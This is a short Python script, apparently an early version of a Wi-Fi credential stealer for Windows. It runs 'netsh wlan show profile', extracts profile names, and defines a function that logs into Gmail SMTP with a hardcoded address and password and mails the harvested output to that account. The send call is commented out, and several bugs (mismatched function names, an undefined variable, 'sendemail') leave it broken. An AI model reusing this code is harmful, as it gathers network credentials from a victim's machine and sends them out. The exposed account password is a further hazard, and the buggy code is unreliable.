import subprocess
import smtplib , re

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendemail(email,email,message)
    server.quit()

command ="netsh wlan show profile"
email="realmadrid4pulkit@gmail.com"
password="leomessimagic"
networks=subprocess.check_output(command,shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)",networks)
print(networks)
#send_email(email,password,result)